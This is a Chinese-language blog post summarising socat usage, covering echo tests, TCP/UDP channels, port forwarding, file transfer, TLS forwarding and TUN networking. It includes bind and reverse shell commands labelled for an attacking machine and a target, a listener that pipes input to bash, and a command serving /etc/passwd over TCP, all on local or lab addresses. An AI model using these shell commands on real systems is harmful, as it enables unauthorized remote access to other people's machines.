
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/kqdssheng/p/18628559" title="发布于 2024-12-24 19:19">
    <span role="heading" aria-level="2">Socat 命令总结</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p><strong>事以密成，语以泄败。</strong></p>
</blockquote>
<hr>
<h3 id="导航">导航</h3>
<ul>
<li><a href="#jieshao" rel="noopener nofollow">介绍</a></li>
<li><a href="#yufa" rel="noopener nofollow">基本语法</a></li>
<li><a href="#shili" rel="noopener nofollow">用法示例</a>
<ul>
<li><a href="#id1" rel="noopener nofollow">回显输入</a></li>
<li><a href="#id2" rel="noopener nofollow">回显输入 over TCP/UDP</a></li>
<li><a href="#id3" rel="noopener nofollow">正向连接 shell</a></li>
<li><a href="#id4" rel="noopener nofollow">反向连接 shell</a></li>
<li><a href="#id5" rel="noopener nofollow">端口转发</a></li>
<li><a href="#id6" rel="noopener nofollow">网络服务</a></li>
<li><a href="#id7" rel="noopener nofollow">文件传输</a></li>
<li><a href="#id8" rel="noopener nofollow">管道传输</a></li>
<li><a href="#id9" rel="noopener nofollow">加密传输</a></li>
<li><a href="#id10" rel="noopener nofollow">TUN 网络</a></li>
</ul>
</li>
<li><a href="#zaxiang" rel="noopener nofollow">杂项</a></li>
</ul>
<hr>
<h3 id="介绍"><div id="jieshao">介绍</div></h3>
<p><strong>Socat</strong> 是一个功能强大的网络工具（相当于是增强版 netcat），它可以在两个数据流之间建立通道，且支持的数据流类型非常丰富，例如：TCP、UDP、TUN、SOCKS 代理、UNIX 套接字、STDIO 标准输入输出流、PIPE 管道流、OPEN 文件流、EXEC/SHELL/SYSTEM 进程流、OPENSSl 加密流等。</p>
<hr>
<h3 id="基本语法"><div id="yufa">基本语法</div></h3>
<pre><code class="language-bash">socat [OPTION] &lt;ADDRESS_1&gt;[,OPTS] &lt;ADDRESS_2&gt;[,OPTS]
</code></pre>
<ul>
<li><strong>ADDRESS_1</strong> 和 <strong>ADDRESS_2</strong> 表示两个通信的端点，即数据流。</li>
<li><strong>OPTION</strong> 用于设置全局选项，比如单向模式、调试模式、日志级别等。【注：单向模式中的 -u 表示左流向右，-U 表示右流向左，不加则表示双向模式。】</li>
<li><strong>OPTS</strong>  用于设置数据流的选项（不同类型的数据流对应的选项亦有所区别），常用的选项是 fork、reuseaddr。</li>
</ul>
<hr>
<h3 id="用法示例"><div id="shili">用法示例</div></h3>
<h4 id="1-回显输入"><div id="id1">1. 回显输入</div></h4>
<pre><code class="language-bash">socat - -	#STDIO STDIO
</code></pre>
<p>说明：在终端输入什么就输出什么。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191318122-201307770.png" alt="image" loading="lazy"></p>
<h4 id="2-回显输入-over-tcpudp"><div id="id2">2. 回显输入 over TCP/UDP</div></h4>
<pre><code class="language-bash">socat - tcp-listen:1234,fork 	#STDIO TCP	服务端监听1234端口
socat - tcp:127.0.0.1:1234		#STDIO TCP	客户端连接1234端口

socat - udp4-listen:1234,bind=192.168.56.20,fork	#STDIO UDP	服务端仅监听192.168.56.20接口的1234端口
socat - udp4:192.168.56.20:1234						#STDIO UDP	客户端连接1234端口
</code></pre>
<p>说明：客户端将输入的数据通过 tcp/udp 通道传输给服务端，而服务端又将接收的数据再传输给标准输出。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191344357-928788121.png" alt="image" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191350650-1350264462.png" alt="image" loading="lazy"></p>
<h4 id="3-正向连接-shell"><div id="id3">3. 正向连接 shell</div></h4>
<pre><code class="language-bash">socat tcp-listen:1234,fork exec:/bin/bash	#TCP EXEC	服务端监听1234端口
socat - tcp:127.0.0.1:1234					#STDIO TCP	客户端连接1234端口
</code></pre>
<p>说明：服务端将接收到的数据传输给 bash 进程，bash 处理之后将结果返回给客户端的标准输出。,</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191507543-870662294.png" alt="image" loading="lazy"></p>
<h4 id="4-反向连接-shell"><div id="id4">4. 反向连接 shell</div></h4>
<pre><code class="language-bash">socat - tcp-listen:1234,fork				#STDIO TCP	攻击机监听1234端口
socat EXEC:/bin/bash tcp:127.0.0.1:1234		#EXEC TCP	靶机连接1234端口
#socat - tcp:127.0.0.1:1234					#STDIO TCP	靶机连接1234端口
</code></pre>
<p>说明：攻击机将输入的数据传输给连接它的靶机，而靶机又将数据传递给了 bash 进程，经其处理之后返回结果到攻击机。【注意：如果有多个靶机同时连接攻击机，那么攻击机的输入会随机被传递给其中一个靶机，而不是同时传递给所有靶机。】</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191522601-194623181.png" alt="image" loading="lazy"></p>
<h4 id="5-端口转发"><div id="id5">5. 端口转发</div></h4>
<pre><code class="language-bash">socat tcp-listen:1234,fork tcp:127.0.0.1:8080	#TCP TCP
</code></pre>
<p>说明：将本地监听端口 tcp/1234 接收的数据转发到本地的 tcp/8080 端口。【转发到远端亦行】</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191538690-450780523.png" alt="image" loading="lazy"></p>
<h4 id="6-网络服务"><div id="id6">6. 网络服务</div></h4>
<pre><code class="language-bash">socat -U tcp-listen:1234,fork open:test.txt		#TCP OPEN
</code></pre>
<p>说明：将文件内容作为服务响应返回。【注意：此时最好使用-U单向模式(右向左)，否则请求可能会覆盖文件内容。】</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191552454-227255581.png" alt="image" loading="lazy"></p>
<h4 id="7-文件传输"><div id="id7">7. 文件传输</div></h4>
<pre><code class="language-bash">socat -U tcp-listen:1234,fork open:/etc/passwd				#TCP OPEN	发送端
socat -u tcp:127.0.0.1:1234 open:./passwd.txt,create		#TCP OPEN	接收端
</code></pre>
<p>说明：发送端将文件数据传输给连接到监听端口的接收端，接收端又将收到的数据打包到新文件中。【注意单向模式的使用】</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191602046-1873155771.png" alt="image" loading="lazy"></p>
<h4 id="8-管道传输"><div id="id8">8. 管道传输</div></h4>
<pre><code class="language-bash">echo ok | socat - tcp-listen:1234,fork	#PIPE TCP
#socat - tcp-listen:1234,fork | bash	#TCP PIPE
</code></pre>
<p>说明：（1）将 echo 输出的数据通过管道传递给连向监听端口的终端；（2）将监听端口接收到的数据传递给 bash 进程处理。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191611736-708700483.png" alt="image" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191618610-350648082.png" alt="image" loading="lazy"></p>
<h4 id="9-加密传输"><div id="id9">9. 加密传输</div></h4>
<pre><code class="language-bash">socat openssl-listen:8443,cert=ssl-cert.pem,key=ssl-cert.key,verify=0,fork tcp:127.0.0.1:8080	#OPENSSL TCP OPENSSL 服务端
#socat - openssl:127.0.0.1:8443,verify=0	#OPENSSL 客户端

#注：当服务端不是转发给 http 服务时，客户端需要此命令配合使用，示例截图中的 curl 命令拥有 openssl 客户端的功能故示例没有用到该命令。
#注：功能测试时，证书的生成可以使用 make-ssl-cert /usr/share/ssl-cert/ssleay.cnf ssl-cert 命令生成。
</code></pre>
<p>说明：监听 HTTPS 请求并将其转发到本地的 HTTP 服务。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191638145-1872039728.png" alt="image" loading="lazy"></p>
<h4 id="10-tun-网络"><div id="id10">10. TUN 网络</div></h4>
<pre><code class="language-bash">socat tcp-listen:1234,fork tun:192.168.1.1/24,up			#TCP TUN	服务端
socat tcp:192.168.56.20:1234 tun:192.168.1.2/24,up			#TCP TUN	客户端
</code></pre>
<p>说明：所有连接到 TUN 服务端的终端，全都接入了一个自建的 TUN 网络之中，从而实现了异地组网。【在 Linux 中测试是成功的，但是在 Windows 中测试是失败的。】</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191648291-781214960.png" alt="image" loading="lazy"></p>
<hr>
<h3 id="杂项"><div id="zaxiang">杂项</div></h3>
<ul>
<li>Socat 官网：<a href="http://www.dest-unreach.org/socat/" target="_blank" rel="noopener nofollow">http://www.dest-unreach.org/socat/</a></li>
<li>Socat for Windows ：<a href="https://github.com/StudioEtrange/socat-windows" target="_blank" rel="noopener nofollow">https://github.com/StudioEtrange/socat-windows</a></li>
</ul>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.045488792885416664" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2024-12-24 19:20">2024-12-24 19:19</span>&nbsp;
<a href="https://www.cnblogs.com/kqdssheng">扛枪的书生</a>&nbsp;
阅读(<span id="post_view_count">9</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18628559" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18628559);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18628559', targetLink: 'https://www.cnblogs.com/kqdssheng/p/18628559', title: 'Socat 命令总结' })">举报</a>
</div>
        